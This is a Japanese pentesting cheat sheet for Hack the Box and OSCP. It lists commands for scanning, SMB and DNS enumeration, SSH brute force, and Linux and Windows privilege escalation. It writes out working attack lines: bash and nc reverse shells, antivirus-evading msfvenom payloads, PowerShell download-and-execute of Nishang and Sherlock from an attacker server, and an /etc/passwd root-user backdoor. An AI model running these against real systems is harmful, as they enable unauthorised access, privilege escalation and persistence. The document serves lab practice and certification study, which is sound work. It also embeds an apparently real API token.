## CheetSheet

Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
日々更新していきます。

## 目次


- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
  - [AutoRecon](#autorecon)
  - [RustScan](#rustscan)
- [偵察](#偵察)
  - [HTTP](#http)
  - [SSH](#ssh)
  - [SMB](#smb)
  - [DNS](#dns)
- [Web Scan](#Web_scan)
  - [ffuf](#ffuf)
  - [gobuster](#gobuster)
  - [dirb](#dirb)
  - [Nikto](#Nikto)
  - [davtest](#davtest)
  - [WPScan](#WPScan)
- [侵入](#侵入)
  - [reverse_shell](#reverse_shell)
    - [PayloadAllTheThings](#PayloadAllTheThings)
    - [msfvenom_reverse_shell](#msfvenom_reverse_shell)
      - Windows(meterpreter)
      - Windows(netcatなど)
      - Linux
      - ASP(msfvenom)
    - [Handlers](#Handlers)
    - [Nishang](#Nishang)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
  - [Linpeas.sh](#Linpeas.sh)
  - [LinEnum](#LinEnum)
  - [PSPY](#PSPY)
  - [GTFOBins](#GTFOBins)
- [セキュリティ診断ツール](#セキュリティ診断ツール)
  - [Burp](#burp)
- [パスワードクラック](#パスワードクラック)
  - hydra
  - John the Ripper
  - hashcat
- [SQL injection](#SQLインジェクション)
- [XML injection](#XMLインジェクション)
- [LFI](#LFI)
- [SSRF](#SSRF)
- [SSTI](#SSTI)
- [Tunneling](#Tunneling)
- [リバースエンジニアリング](#リバースエンジニアリング)
- [Windowsコマンド](#Windowsコマンド)
- [便利コマンド](#便利コマンド)

    
  


# Network_scan

### TLDL;

1. nmapAutomator

```
nmapAutomator.sh 10.10.10.9 All

```

2. AutoRecon

```

./Autorecon.sh 10.10.10.9

```


### Nmap

オプションは、[こちら](https://www.checksite.jp/nmap-command-option/) がわかりやすい

基本コマンド

```
nmap -Pn -A 10.10.10.11

-Pn : ICMPのみでなく80,443番ポートにもTCPパケットを送り、同セグメントではARPも送信しホストの存在を判断
-A : OSの種類とそのバージョンを検知


nmap -sV -sC -Pn -oN sample.txt 10.10.10.5

-sC : デフォルトスクリプトでスキャン
-sV : バージョン検出
-oN : 通常出力
```

他に

```

nmap -sV -O -F --version-light 10.10.10.3


-sV: Probe open ports to determine service/version info
-O: Enable OS detection
-F: Fast mode - Scan fewer ports than the default scan
--version-light: Limit to most likely probes (intensity 2)


・集中して大量にみたいときは、
nmap -A -v 10.10.10.3

-v  冗長性をあげる

・早く結果を見たい
nmap -Pn -T4 -A -v 10.10.10.3

-T2:
polite
スキャン速度を落とす

-T3:
normal
デフォルト

-T4:
aggressive
スキャン速度を上げる

```

### NSE

Nmap Scripting Engine。

Nmap を単なるポートスキャナーから、脆弱性調査ツールへと変身させる機能拡張ができる。

[公式一覧](https://nmap.org/nsedoc/index.html)

[リンク](http://www.byakuya-shobo.co.jp/hj/moh2/pdf/moh2_p120_p131.pdf)

```

・どのNSEを使うかの調査
ls /usr/share/nmap/scripts | grep nfs
のように、nmap の結果をみて、どのscript を使うか絞り込める。


・ 既知の脆弱性調査
nmap -Pn -p 445 --script vuln 10.10.10.4


・robots.txt で指定される巡回拒否ファイルをチェック
nmap -Pn -p 80 --script=http.robots.txt 10.10.10.4

```

[参考](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)


### Autorecon

[リンク](https://github.com/Tib3rius/AutoRecon)

AutoReconは、まずTCPのデフォルト1000ポートスキャンのNmapScanを実行し、そこで見つかったサービスに対して、個別にNmapのVulnスクリプトやNikto、enum4linuxなどを実行する。
同時並行でTCP fullNmapScanも実行し、そこで新たに見つかったサービスに対してもさらにNmapなどを実行してくれる。


### RustScan

Nmapのスキャンを高速化したRust製ポートスキャナ

Nmapで17分かかる処理を1分以内に抑える高速化を実現している

```
 rustscan -a 10.10.10.197

```

# 偵察 

- 着目すべきポート

```

80/TCP:HTTP, 443/TCP:HTTPS
　->各ページにある脆弱性を使える

135/TCP:MSRPC, 139/TCP:NetBios-SSN, 445/TCP:Microsoft-DS
　->Eternal Blueなどが使える

21/TCP:FTP
　->anonymousユーザなどでファイルの中身を見たり、アップロードしたりできる

22/TCP:SSH
　->BruteForceにより突破できるかも

389, 636:LDAP
　->ActiveDirectoryに関する脆弱性があるかも
 ```


# HTTP

### minimum todo

```

- robots.txt，sitemap.xml,README.txtの確認
- サブドメインの列挙
- ディレクトリスキャナーの使用(ffuf, gobuster, dirb, nikto はmust)
- CMSの特定 (version が調べたかったら、CMS名 + version checkと検索(Joomla など))
- ログインの試行
  - デフォルトパスワードの入力
  - パスワード推測
  - SQLインジェクションの試行 (Union based injection もちゃんと調べる)
  - Webサイト上にある情報からユーザー/パスワードリストの作成
  - ブルートフォース
- BurpSuiteを用いてWebの挙動の確認
- バージョン番号を探し、CVE がないか確認
- script を実行できそうなconsoleがないか確認
- URLを見て、LFIの脆弱性が無いか確認
- URLやinput Fieldを見て、 ${{<%[%'"}}%　を入力し、internal server error がでてたらSSTI を疑う。 
- URLやinputFieldに入力した文字が動的に表示された時に、SSTIを疑う
- XML injection できる場所はないか確認
- source codeみて、OSコマンド injection がおきそうな危険な関数が使われていないか確認
- upload機構がある場合、バイパス方法の模索
- uri を入力する部分、(url=http://  proxy=http:// ) などのurlがあれば、SSRFがないか確認
- template fileや 404.phpなどを reverse shell file に書き換えられない確認
- 画像やPDFをダウンロードできるならして、 exiftool input.jpg　でmeta情報からuser情報を取得できるか確認
- 掲載されている画像にヒントが無いか確認

```

### OS コマンドinjection がおきる関数

```
PHP: 
exec(), shell_exec()
　コマンド結果の最後の行を返します。
system()
　成功時はコマンド出力の最後の行を返し、失敗時は false を返します。
passthru()
　一切干渉を受けずに直接コマンドから全てのデータを受けとる。
proc_open(), popen()

Python: 
eval(), 

os.system(''), stream = os.popen('echo Returned output'); output = stream.read()、import subprocess

process = subprocess.Popen(['echo', 'More output'],
                     stdout=subprocess.PIPE, 
                     stderr=subprocess.PIPE)
stdout, stderr = process.communicate()

Perl: exec(), system(), open(), qx/.../, `...`
...

[Python 記事](https://janakiev.com/blog/python-shell-commands/)

```

- shellによる複数コマンド(徳丸本より抜粋)

<img width="584" alt="スクリーンショット 2021-01-28 17 39 05" src="https://user-images.githubusercontent.com/39001773/129119783-5b96d20d-addc-42b8-9a37-867df89afb7a.png">


### VHOST の列挙

```

ffuf -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u https://test-url -H "Host: FUZZ"

ffufはデフォルトでは、レスポンスのHTTPステータスコードが「200、204、301、302、307、401、403、405」の場合に、標準出力に結果を表示する。
オプションを使えば、スキャンの目的に応じて、表示する内容を変更することが可能。

オプション例：
例1）HTTPステータスコードが200もしくは301のみを表示
-mc 200,301
例2）レスポンスサイズが4242のものを表示しない
-fs 4242


gobuster vhost -u http://horizontall.htb -t 50 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

上でダメなら、これやる(horizontall)
gobuster vhost -u http://horizontall.htb -t 50 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  

```

### ディレクトリの列挙 (深堀り)

```
ffuf -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt  -u https://seal.htb/manager/FUZZ -fc 403 -recursion

fc: Filter HTTP status codes from response. Comma separated list of codes and ranges

fs: Size 703 とでたら、-fs 703 とフィルターして、みやすくなる(00:00Studio で視聴者さんが教えてくれた)

```

### サブドメインの列挙

```

ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.htb -H "Host: FUZZ.schooled.htb" -fw 5338

```

# SSH

### user name がわからないとき

[リンク](https://yurisk.info/2010/06/04/top-10-usernames-used-in-ssh-brute-force/) や以下を順にためす

```
[contact] => 25
[support] => 28
[info] => 35
[user] => 36
[mysql] => 43
[postgres] => 45
[guest] => 62
[test] => 104
[admin] => 106
[root] => 581

```

### SSH bruteforce 

ユーザーが分かっていた時

```

hydra -l kyle -P ~/rockyou.txt ssh://writer.htb -VV -f -t 60

-t: 並列で実行するtask数 (defualt 16)

-f: login/pass pair が見つかったら終了

-VV: show login/pass for each attempt

```

### SCP
カレントディレクトリにsecret.zipをダウンロード

```
scp charix@10.10.10.84:/home/charix/secret.zip .

```


### フォワーディング

```
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84

```


### ssh のid_rsa が暗号化されてる時

```

python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
john --wordlist=/usr/share/wordlists/rockyou.txt ssh-key

```

### ssh-keygen

```
ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
```
- -t...暗号の種類(ed25519,rsaなど)
- -b...ビット数の固定(-t rsa -b 4096など)
- -f...ファイル名(id_????の?部分)


# SMB

Port: 139, 445

[リンク](https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/)

### minimum Todo

- rpcclient

```
Testing for Null or Authenticated Sessions:

rpcclient -U "" -N [ip]

Have valid credentials? Use them to connect:

rpcclient -U <user> 10.10.10.193



```
接続できれば以下のクエリを試す


```

To enumerate printers:
enumprinters

To enumerate users and groups:
enumdomusers
enumdomgroups

The above command will output user/group RIDs. You can pass those into further queries like:
querygroup <RID>
querygroupmem <RID>
queryuser <RID>

```


- Try Hack Me 流

```

1. share の列挙

nmap -p 445 --script=smb-enum-* <target ip>

\\10.10.20.236\anonymous:
Anonymous access: READ/WRITE

などの情報が得られる


2. 1で得られたshare にアクセス

smbclient //<target ip>/anonymous

smbcient -N //<target ip>/anonymous
N: クライアントはユーザーへの パスワード入力要求をしなくなる

-N でうまくいかない場合は、
smbclient -L  //<target ip>/   を試す  


password が見つかっている場合は、以下でアクセス(TryHackMe skynet)
smbclient //10.10.18.82/milesdyson --user=milesdyson  


3. 2で入手したいファイル(ex: log.txt)があった場合

smb 上で

get log.txt

または、kali 上で

smbget -R smb://<target ip>/anonymous

```

- その他

```

// SMBによるOSの検出や列挙(smb-os-discovery)
nmap -v -p 139, 445 --script=smb-os-discovery <target ip>

// SMBプロトコルの既知の脆弱性をチェックする場合
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <target ip>

// 匿名ログインが有効になっているか確認
smbclient -N -L <target ip>

// WindowsおよびSambaホストからのデータを列挙
enum4linux -U -o <target ip>

enum4linux -S <target ip>

enum4linux -P <target ip>

- -U...ユーザリスト取得
- -o...OS情報取得
- -S...sharelist取得
- -P...password policy情報取得

```


# DNS

Port: 53

### ドメイン名の特定
DNSサーバー = 10.10.10.13  
ドメイン名を調べたいIPアドレス = 10.10.10.13  
10.10.10.13 = ns1.cronos.htb
```
┌──(kali㉿kali)-[~]
└─$ nslookup
> server 10.10.10.13　# DNSサーバーの指定
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

### サブドメインの列挙
#### DNSゾーン転送
権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
これによりサーバーの名前、アドレス、機能などを調べることができる。
```
dig axfr cronos.htb @10.10.10.13
```
```
host -l <domain name> <dns server address>
```

#### DNSRecon
DNS列挙スクリプト。  
サブドメインの列挙。(ゾーン転送とブルートフォース)
```
1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
- -d...ドメイン名の指定
- -t...実行する列挙の種類(1つ目はゾーン転送)
- -t...実行する列挙の種類(2つ目はブルートフォース)
- -D...サブドメイン文字列を含むワードリストファイルの指定

#### DNSmap
サブドメインの列挙。(ブルートフォース)
```
┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
dnsmap 0.35 - DNS Network Mapper

[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] using maximum random delay of 10 millisecond(s) between requests

www.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed

admin.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed
```


# Web_scan

ファジングを高速に、簡便にという意味が込められたWEBファジングツール

### ffuf

[公式](https://github.com/ffuf/ffuf)

[解説記事](https://jpn.nec.com/cybersecurity/blog/210604/index.html)

```

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.247/FUZZ


```

### gobuster

[リンク](https://tools.kali.org/web-applications/gobuster)
ディレクトリスキャナー。  
隠されたディレクトリや公開範囲が間違えて設定されているものはないかを調べるために使用。

```
gobuster dir -t 100 -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定


```
実際の使用例
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o blocky_gobuster

```

### dirb 

[リンク](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86)

```
　dirb http://172.17.0.2/mutillidae

 DIRB IS a Web Content Scanner.  It  looks  for  existing
 (and/or  hidden)  Web  Objects. 
 It  basically  works by launching a  dictionary  basesd  attack 
 against  a  web server and analizing the response.

```

### Nikto

[リンク](https://kaworu.jpn.org/security/Nikto)

Web 脆弱性スキャナ。
任意のWebサーバー（Apache、Nginx、IHS、OHS、Litespeedなど）で使用できる。
Webサイトのセキュリティ上の欠陥を識別して、見つかった各問題の詳細な参照を提供する。

```
nikto -h <target url> -Format txt -o <output filename>

-h...url指定
-Format...出力するファイルの拡張子を指定
-o...ファイルへ出力する
-ssl...SSLを使用するサイトで使用


ex): nikto -h http://10.10.10.15

```


### davtest

[リンク](https://tools.kali.org/web-applications/davtest)

DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

```

davtest --url 10.10.10.14   

```


### WPScan
WordPressの脆弱性診断ツール。

```
wpscan -url <target url> -e u -t -vp --log <output filename>
```

- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力


```
実際の使用例

 wpscan --url 10.10.10.37 -e u
```

API-token を設定することで、WordPress脆弱性データをリアルタイムで取得して検出できる。

token取得は、[こちら](https://wpscan.com/profile)から

```

wpscan --url http://XXXXXX/WordPress/ -e vp --api-token xxxxxxxxxxxxxxxxxxxxxxxx


ex:
wpscan --url 10.10.10.17 -e u,vp --api-token KDuAhQpTshtAEPxDLNZLiWrkszFxb8kf8t6a3IR6RKw


```

### ログインの検証

```

wpscan --url internal.thm/wordpress/ --passwords rockyou.txt --usernames admin --max-threads 50

```

[参考記事](https://qiita.com/koujimatsuda11/items/d49e8642dea1a1b0d067)
[実例machine](https://ranakhalil101.medium.com/hack-the-box-brainfuck-writeup-w-o-metasploit-5075c0c55e93)

# 侵入

## reverse_shell


[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

reverse_shell 全部乗ってて、大変便利


## msfvenom

[CheetSheet recommend](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)

[CheetSheet](https://github.com/frizb/MSF-Venom-Cheatsheet)



```

　msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=8080 -e x86/shikata_ga_nai -f exe -o /root/apache-update.exe
 
e: ペイロードを使用したところで、アンチウイルスソフトで検出される可能性も高いため、アンチウイルスの検出を回避するために、エンコードする
   shikata_ga_nai

 

 ```


#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```


#### bash
```
bash -i >& /dev/tcp/[url]/[port] 0>&1

ex: bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```
better shell をとるのに使った　[リンク](https://codemonkeyism.co.uk/htb-shocker/)


#### Windows(netcatなど)


msfvenom で payload 作成

```

msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe

````

powershell で download

```

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/reverse.exe','reverse.exe')"


```

metasploit で multi/handler を待ち構えて、ダウンロードしたファイルを実行

```
powershell "Start-Process "reverse.exe"

```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

#### ASP(msfvenom)  Microsoft IIS httpd の時、first でこれ考える！

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp

x64 と判明していた場合(TryHackMe relevant)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.219.23 LPORT=4242   -f aspx > reverse.aspx  

```


#### Handlers
```
use exploit/multi/handler
set payload <payload>   (set payload windows/meterpreter/reverse_tcp、　set payload linux/x86/meterpreter/reverse_tcp など)
set LHOST <ip address>
set LPORT <port number>
run
```


## Nishang (Windows, Invoke-PowerShellTcp.ps1)

Powershell を使って、reverse shell 取得可能

~/nishang/shell へ移動し、http server 起動

```

C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
SysNative: 64-bit architecture system binaries are located.


powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4444


```


# 特権エスカレーション基本戦略 [Linux]

[毎回必ず見る資料](https://xorond.com/posts/2020/08/linux-privilege-escalation-basics/)

[上記、簡易日本語版](https://syachineko.hatenablog.com/entry/2020/09/07/213646)

[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)


### minimum todo



- Linux Distribution, Kernel version, cpu architecture の確認

```
cat /etc/*issue # linux distribution
cat /etc/*release # linux distribution
uname -a # hostname, kernel version, cpu architecture (32-bit vs. 64-bit)

uname がない場合は
dmesg | head -n1 
```

- network の確認

```

cat /etc/network/interfaces # show network config
cat /etc/sysconfig/network # show network config
iptables -xvL # show firewall rules

netstat -aeet # show service names
netstat -antpl
ss -tpl # resolve service name
ss -antpl # if 'netstat' doesn't exist

```


- 特権アクセスの確認

```
cat /etc/sudoers # can we read? which users have sudo privileges?
sudo -l # can we use sudo? do we need a password?
ls -al /root # can we read /root?
ls -alR /home # check permissions for /home directories

とくに、何らかのpassword が得られた状態で、lateral movement をしたいuser 名があるとき、
su user名　をtry する。
lateral movement に成功したら、必ず、sudo -l をやる。
(Try Hackme: Daily Bulge)


```

- id コマンドで、ユーザーの識別情報を確認

```
group で怪しいものがあった場合は、find コマンドで調査する

john@writer:/etc/apt/apt.conf.d$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)

john@writer:/etc/apt/apt.conf.d$ cd
john@writer:~$ find / -type d -group management 2>/dev/null


```

- SUID binaries と capabilitiesを探す

[リンク、まずこれみる](https://mil0.io/linux-privesc/)

[リンク](https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/#exploitation-with-file-writing)

```
find / -writable -type d 2>/dev/null # show writable folders
find / -writable -type f 2>/dev/null # show writable files
find / -perm -4000 -type f 2>/dev/null # search system for suid files
find / -perm -u=s -type f 2>/dev/null

custom suid実行ファイルを探す。 (default が何か不明な時は、手元のMacOSで上のコマンドを打ち、結果を比較する。)

* common binaries は以下のことを考える: 

cp,mv: You can write anywhere, so move or copy over /etc/passwd to add a user (kind of dangerous) or a SSH key.
less,more: Call !bash
man man: Again call !bash
expect: Call spawn bash, then bash
awk: Run awk 'BEGIN {system("/bin/sh")}'
Text editors: Like vi most of these have shell escapes.

```

・ capabilities 確認

```

getcap -r / 2>/dev/null 

ex: これで、python がでてきたら。

python -c 'import os; os.setuid(0); os.system("/bin/bash")'

(eval の場合、 `__import__('os').system('nc your_ip port -e /bin/sh')` のように書く)
 

```

上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。

- ある特定のファイルが定期実行されているか？

```
cat /etc/crontab 
cat /var/log/syslog

```

- あやしいプロセスはないか？

```
ps aux | grep root 
ps aux | grep <user_name> 
ps -ef | grep <process_name> 
```

- PATH injection できるか？

[リンク](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

```

// 環境変数にキーやパスワードがあったり、隠れたbinファイルをPATHで見つける
echo $PATH # current value of PATH
env # display environment information


ex: sudo -l で、あるファイル(/opt/scripts/access_backup.sh)が、root 権限で実行できるとき、そのファイルの中身で、 gzip ... というshell script が書いてあるとする
#!/bin/bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

→ tmp フォルダに、名前が、gzip というファイルを作り、中にreverse shellをかく

→ PATH=$(pwd):$PATH でPATH をぬりかえ。
/usr/local/sbin:/usr/local/bin → /tmp:/usr/local/sbin:/usr/local/bin 

→ sudo /opt/scripts/access_backup.sh

```


- wildcard injection できるか？

[解説動画](https://www.youtube.com/watch?v=HXikLrFVIXc)

[リンク](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

```

tar cf /var/backups/backup.tar *

```

- etc/passwd が writeable か？

```
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash

root2: username
WVLY0mgH0RtUI: encrypted password (mrcake)
0:0: user id and group id are both 0(root)
root: comment field
/root: home directory
/bin/bash: default shell

```


- symlink を使って、/etc/passwd を上書きできるか？

ln コマンドを使う

```

ln -s mylist02.txt latest

```

これで、「latest」というファイルを編集したり、閲覧したりすることが、「mylist02.txt」を編集したり、閲覧したりすることと同じ結果になる。

```

mkdir source
cp /etc/passwd source/passwd 
echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> source/passwd 


```

- CVE などでコマンドが実行できる時

必ずしも、root のshell を奪取しなくても、cat /root/root.txt

などでflag を取得することはできる。(horizontall)


- その他

```

// etc配下のファイルにある文字列列挙
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null 
grep -Ri password $(find /etc -name '*.conf' 2>/dev/null) 

// ファイル名に「○○」という文字列が含まれているファイルのリストを取得。
find [検索対象フォルダのパス] -type f -name "*[検索したい文字列]*"

// 特殊なtxtファイルはないか？ (TryHackMe internal, password があった)
locate *.txt

// show installed packages and versions
dpkg -l 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/" 


// その他

which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 

ls /dev 2>/dev/null | grep -i "sd" 

cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null 
```


## Linpeas.sh

[リンク](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

・[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)

```

実行：
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh


```


LinPEAS で不十分な時は、[linux-smart-enumeration(lse.sh)](https://github.com/diego-treitos/linux-smart-enumeration) 検討する。

・[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)


## LinEnum

権限昇格が行える箇所がないかチェックするシェルスクリプト

[Linux 権限昇格ツール解説一覧](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)

[Github](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

[リンク](https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/)

[machine](https://medium.com/swlh/hack-the-box-cronos-writeup-w-o-metasploit-7b9453e557d0)


## コマンド

```
uname -a

cat /etc/*release

```

<img width="384" alt="スクリーンショット 2021-01-28 17 39 05" src="https://user-images.githubusercontent.com/39001773/120716155-970fd080-c500-11eb-8d10-b4e7ed95910b.png">


で情報を掴み、exproit db で、local priviledge escalation などを探す。



## PSPY

[リンク](https://github.com/DominicBreuker/pspy)

実行しているプロセスをダンプしてくれる。

linpeas.shなどでps auxだけでは確認できないものも確認できる

[使い方](https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/)


## GTFOBins

[リンク](https://gtfobins.github.io/)

ローカルのセキュリティ制限を回避する、バイナリ集

見慣れないコマンドがあったら、こちらから探す。 
(machine では、ここから、jounralctl, python　検索して root 奪取した)



# 特権エスカレーション基本戦略 (Windows)

[毎回必ず見る資料](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/)


[その他資料: HackTricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)


```
PS C:\> whoami
PS C:\> whoami /priv # exploitable privileges?
PS C:\> whoami /groups # administrator?

ex: 
whoami /priv で、
SeImpersonatePrivilege   enabled      // Impersonate a client after authentication   

→  PrintSpoofer (or Juicy Potato) 

 PrintSpoofer.exe -i -c cmd

```



```

PS C:\> hostname
PS C:\> ipconfig /all ; route print ; arp -a # network information
PS C:\> netstat -anto | Select-String "listening" # check for services on loopback
PS C:\> netstat -anto | Select-String "established" # check outgoing connections
PS C:\> netsh advfirewall show allprofiles # firewall settings


```

systeminfo で、OS name, OS version をcheck.

hotfix で、update がされているか確認。

```
ex: 

OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
OS Version:             6.1.7600 N/A Build 7600
HotFix:                 N/A

```


[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) を使う

```

./windows-exploit-suggester.py --update

systeminfo の内容をコピーし、systeminfo.txt をつくる
その後、以下のようなコマンドをうつ

./windows-exploit-suggester.py --database 2021-07-18-mssb.xls --systeminfo ~/hackTheBox/bastard/sysinfo.txt

```

hit したものを、github で検索たり、
[チートシート](https://kakyouim.hatenablog.com/entry/2020/05/27/010807)　で検索。


[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

ex: [MS-059](https://medium.com/@pkhadka56/hackthebox-devel-windows-46763fdd5720)


## Sherlock.ps1

local privilege escalation をするために、 Kernel Exploitを列挙するps1のスクリプト。

Powershellが使えるならEmpire上から、実行する。

[Optimum Ippsec movie](https://www.youtube.com/watch?v=kWTnVBIpNsE)

```

IEX(New-Object Net.Webclient).downloadString('http://10.10.14.5:8000/Sherlock.ps1'); Find-AllVulns

```

vulnerable がみつかったら、empire にmodule があるかチェック

[参考記事](https://iammainul.medium.com/hackthebox-optimum-walkthrough-powershell-only-21e17a8d29b3)

ex: MS16-032

```

Empire/data/module_source/privesc/Invoke-MS16032.ps1

vi で使い方見て、ファイルの最終行を編集し

IEX(New-Object Net.Webclient).downloadString('http://10.10.14.15/Invoke-MS16032.ps1')

```

## metasploit(local_exploit_suggester)

[https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)

meterpreterでシェルを手に入れている場合、local_exploit_suggesterを使うことで、特権昇格に使える exploit を探すことができる

```jsx
background

use post/multi/recon/local_exploit_suggester
```

```
session を interactive に戻す時
sessions -i 1

```

access denied の時、プロセスが原因？

ps　で root 権限で動いているプロセスを確認し、
[migrate コマンド](https://security.stackexchange.com/questions/90578/how-does-process-migration-work-in-meterpreter)使う  

```
migrate 1836

meterpreterプロンプト下でmigrateコマンドを使うことで、バックドアを既存のプロセスに統合させることが出来る
```


## Powersploit

権限昇格に使う。

[Github](https://github.com/PowerShellMafia/PowerSploit)

[使い方](https://powersploit.readthedocs.io/en/latest/Privesc/Find-ProcessDLLHijack/)


```

TryHackMe steel mountain:
meterpreter から、 upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

load powershell
powershell_shell

PS > . .\PowerUp.ps1

PS > Invoke-AllChecks


ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

こう言う結果を見たら、CanRestart と WriteAttributes に注目。
true　だったら、malicious コードにおきかえて、再起動できる。

```


# セキュリティ診断ツール

### Burp

[設定方法](https://www.as-lab.net/howto-use-localproxy/)
[リンク](https://persol-tech-s.co.jp/corporate/security/article.html?id=10)

ブラウザとサーバ間のHTTP通信をキャプチャし、通信内容を閲覧および改竄できるツール
